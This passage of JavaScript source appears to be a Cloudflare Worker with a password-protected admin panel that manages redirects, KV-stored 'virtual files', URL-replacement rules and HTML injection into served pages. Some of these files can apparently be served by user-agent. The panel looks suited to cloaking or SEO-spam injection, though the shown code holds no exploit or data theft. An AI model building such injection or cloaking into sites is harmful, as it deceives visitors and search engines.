    e.preventDefault();

    origType.value = b.dataset.type;
    origId.value = b.dataset.id || '';

    redirType.value = b.dataset.type === 'wide' ? 'wide' : 'exact';

    fromInput.value = b.dataset.from || '';
    hostInput.value = b.dataset.host || '';
    pathInput.value = b.dataset.path || '';
    toInput.value = b.dataset.to || '';
    codeInput.value = b.dataset.code || '301';

    keepPath.checked = b.dataset.keeppath !== '0';
    keepQuery.checked = b.dataset.keepquery !== '0';

    syncRedir();

    scrollTo(0, 0);
  };
});

function clearFileForm() {
  filePathInput.value = '';
  fileUaMode.value = 'all';
  fileContent.value = '';
  fileMatchPaths.value = '';
  fileTargetAnchor.value = '';
  fileInjectHtml.value = '';
  filePathInput.focus();
}

clearFile.onclick = clearFileForm;

function clearUrlRepForm() {
  urlRepIdx.value = '';
  urlRepFrom.value = '';
  urlRepTo.value = '';
  urlRepFrom.focus();
}

clearUrlRep.onclick = clearUrlRepForm;

document.querySelectorAll('.editUrlRep').forEach((b) => {
  b.onclick = (e) => {
    e.preventDefault();

    urlRepIdx.value = b.dataset.idx;
    urlRepFrom.value = b.dataset.from || '';
    urlRepTo.value = b.dataset.to || '';
    urlRepFrom.focus();
  };
});
</script>

</body>
</html>`;
}

async function handleMaster(req, env) {
  const method = req.method.toUpperCase();
  const logged = await isLoggedIn(req);

  if (method === "POST") {
    const form = await req.formData();
    const action = String(form.get("action") || "");

    if (action === "login") {
      const pass = String(form.get("password") || "");

      if (pass !== ADMIN_PASSWORD) {
        return htmlResp(renderLogin("Password salah."), 401);
      }

      const token = await makeSessionToken();

      return new Response(null, {
        status: 303,
        headers: {
          location: MASTER_PATH,
          "set-cookie": loginCookie(token),
        },
      });
    }

    if (action === "logout") {
      return new Response(null, {
        status: 303,
        headers: {
          location: MASTER_PATH + "?ok=logout",
          "set-cookie": logoutCookie(),
        },
      });
    }

    if (!logged) {
      return htmlResp(renderLogin(), 401);
    }

    try {
      if (action === "save_redirect") {
        if (!kv301(env)) return textResp("KV kv301 belum binding.", 500);

        await saveRedirectRule(env, form);

        return redirectHere(req, MASTER_PATH + "?ok=redir_saved");
      }

      if (action === "del_redirect") {
        if (!kv301(env)) return textResp("KV kv301 belum binding.", 500);

        await deleteRedirectRule(env, form);

        return redirectHere(req, MASTER_PATH + "?ok=redir_deleted");
      }

      if (action === "save_file") {
        if (!kvp(env)) return textResp("KV kvpanels belum binding.", 500);

        await savePanelFile(env, form);

        const path = normalizeVirtualFilePath(form.get("path"));

        return redirectHere(
          req,
          MASTER_PATH + "?path=" + encodeURIComponent(path) + "&ok=file_saved"
        );
      }

      if (action === "del_file") {
        if (!kvp(env)) return textResp("KV kvpanels belum binding.", 500);

        await deletePanelFile(env, form.get("path"));

        return redirectHere(req, MASTER_PATH + "?ok=file_deleted");
      }

      if (action === "add_urlrep") {
        if (!kvp(env)) return textResp("KV kvpanels belum binding.", 500);

        const from = String(form.get("from") || "");
        const to = String(form.get("to") || "");
        const idx = Number(form.get("urlrep_idx"));

        if (from && to) {
          const rules = await getUrlReplaceRules(env);

          if (Number.isInteger(idx) && idx >= 0 && idx < rules.length) {
            rules[idx] = { from, to };
          } else {
            rules.push({ from, to });
          }

          await putUrlReplaceRules(env, rules);
        }

        return redirectHere(req, MASTER_PATH + "?ok=urlrep_saved");
      }

      if (action === "del_urlrep") {
        if (!kvp(env)) return textResp("KV kvpanels belum binding.", 500);

        const idx = Number(form.get("idx"));
        const rules = await getUrlReplaceRules(env);

        if (Number.isInteger(idx) && idx >= 0 && idx < rules.length) {
          rules.splice(idx, 1);
        }

        await putUrlReplaceRules(env, rules);

        return redirectHere(req, MASTER_PATH + "?ok=urlrep_deleted");
      }

      return textResp("Unknown action", 400);
    } catch (err) {
      return htmlResp(
        renderLogin("Error: " + String(err && err.message ? err.message : err)),
        500
      );
    }
  }

  if (!logged) {
    return htmlResp(renderLogin(), 401);
  }

  const url = new URL(req.url);
  const currentPath = normalizeVirtualFilePath(url.searchParams.get("path") || "");

  const [redirectStore, fileIndex, urlRules] = await Promise.all([
    getRedirectStore(env),
    getFileIndex(env),
    getUrlReplaceRules(env),
  ]);

  const current = currentPath ? await getPanelEntry(env, currentPath) : null;

  return htmlResp(
    renderMasterDashboard({
      redirectStore,
      fileIndex,
      current,
      urlRules,
      ok: url.searchParams.get("ok") || "",
    })
  );
}

async function fetchAssets(req, env) {
  if (env.ASSETS && typeof env.ASSETS.fetch === "function") {
    return env.ASSETS.fetch(req);
  }

  return new Response("ASSETS binding not found", {
    status: 404,
  });
}

export default {
  async fetch(req, env, ctx) {
    const url = new URL(req.url);
    const pathname = normalizePathname(url.pathname);

    if (pathname === "/__status") {
      return textResp("ok");
    }

    if (pathname === MASTER_PATH || pathname.startsWith(MASTER_PATH + "/")) {
      return handleMaster(req, env);
    }

    const redirectStore = await getRedirectStore(env);
    const redir = findRedirect(req, redirectStore);

    if (redir) {
      return Response.redirect(redir.to, redir.code);
    }

    if (kvp(env)) {
      const virtualResp = await serveVirtualFile(env, req, pathname);
      if (virtualResp) return virtualResp;
    }

    let assetResp = await fetchAssets(req, env);

    if (assetResp.status === 404 && kvp(env)) {
      const virtualResp = await serveVirtualFile(env, req, pathname);
      if (virtualResp) return virtualResp;
    }

    if (kvp(env)) {
      assetResp = await maybeRewriteHtmlResponse(env, req, assetResp);
    }

    return assetResp;
  },

  async email(message, env, ctx) {
    return;
  },
};